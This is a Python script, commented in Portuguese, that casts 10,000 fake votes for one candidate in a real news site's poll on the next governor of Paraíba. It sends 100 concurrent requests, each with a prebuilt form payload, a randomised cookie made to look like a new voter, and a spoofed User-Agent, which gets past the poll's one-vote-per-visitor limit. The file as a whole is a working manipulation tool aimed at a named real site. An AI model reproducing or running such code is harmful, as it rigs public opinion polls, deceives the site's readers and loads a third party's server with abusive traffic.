import asyncio
import uuid
import uvloop
import httpx
from fake_useragent import UserAgent
from tqdm import tqdm

# --- Configurações principais ---
URL_ENQUETE    = "https://www.polemicaparaiba.com.br/politica/enquete-polemica-paraiba-em-quem-voce-votaria-para-ser-o-proximo-governador-da-paraiba/"
NUMERO_VOTOS   = 10000
CONCURRENCY    = 100
LOG_INTERVAL   = 200

# Substitui o loop padrão
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

# Gera User-Agent aleatório
ua = UserAgent()

# Contadores de sucesso e erro
success = 0
errors  = 0

# Boundary fixo e payload pré-montado (bytes)
BOUNDARY = "----MyBoundary123456"
PAYLOAD = (
    f"--{BOUNDARY}\r\n"
    f'Content-Disposition: form-data; name="totalpoll[choices][9368332c-8ee9-447c-9009-3bab6e2e6107][]"\r\n\r\n'
    f'd6a33e0b-f11d-40d8-854b-b318f4cfa492\r\n'
    f"--{BOUNDARY}\r\n"
    'Content-Disposition: form-data; name="totalpoll[screen]"\r\n\r\n'
    'vote\r\n'
    f"--{BOUNDARY}\r\n"
    'Content-Disposition: form-data; name="totalpoll[pollId]"\r\n\r\n'
    '1111618\r\n'
    f"--{BOUNDARY}\r\n"
    'Content-Disposition: form-data; name="totalpoll[action]"\r\n\r\n'
    'vote\r\n'
    f"--{BOUNDARY}--\r\n"
).encode('utf-8')


async def worker(client: httpx.AsyncClient, queue: asyncio.Queue, pbar: tqdm):
    global success, errors
    while True:
        try:
            await queue.get()
        except asyncio.CancelledError:
            break

        try:
            # Gera cookie único
            sid = uuid.uuid4().hex
            cookie_value = f"{sid[:8]}-{sid[8:12]}-{sid[12:16]}-{sid[16:20]}-{sid[20:]}"
            
            headers = {
                "User-Agent": ua.random,
                "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
                "Cache-Control": "no-cache"               # força não usar cache
            }
            cookies = {
                "tp_469f4fb05e034c5f02005fcefe4a590c": cookie_value,
                "tp_888528ee1239aabb66bc30459c8a90eee": "1"
            }

            # Envio da requisição
            resp = await client.post(
                URL_ENQUETE,
                content=PAYLOAD,
                headers=headers,
                cookies=cookies,
                timeout=15
            )

            success += 1
            if success % LOG_INTERVAL == 0:
                pbar.write(f"✅ Votos: {success} | 🛑 Erros: {errors} | Status: {resp.status_code}")

            # Limpa cookies do client para não acumular estado
            client.cookies.clear()

        except Exception as e:
            errors += 1
            if errors % LOG_INTERVAL == 0:
                pbar.write(f"❌ Erro: {e!r}")
        finally:
            pbar.update(1)
            queue.task_done()


async def main():
    # Prepara a fila
    queue = asyncio.Queue()
    for _ in range(NUMERO_VOTOS):
        await queue.put(None)

    # Configura o HTTP client
    limits = httpx.Limits(max_connections=CONCURRENCY)
    async with httpx.AsyncClient(http2=True, limits=limits, follow_redirects=True) as client:
        # Cria a barra de progresso antes de disparar os workers
        with tqdm(total=NUMERO_VOTOS, desc="🔥 Enviando votos") as pbar:
            # Inicia os workers, passando o mesmo pbar para todos
            workers = [asyncio.create_task(worker(client, queue, pbar)) for _ in range(CONCURRENCY)]
            # Aguarda a fila esvaziar
            await queue.join()
            # Cancela os workers para que eles parem o loop
            for w in workers:
                w.cancel()
            # Opcional: aguarda todos terminarem
            await asyncio.gather(*workers, return_exceptions=True)

    # Resultado final
    print("\n🏁 Resultado final:")
    print(f"✅ Sucessos: {success} | 🛑 Erros: {errors}")
    print(f"📊 Taxa de sucesso: {(success/NUMERO_VOTOS)*100:.2f}%")

if __name__ == "__main__":
    asyncio.run(main())
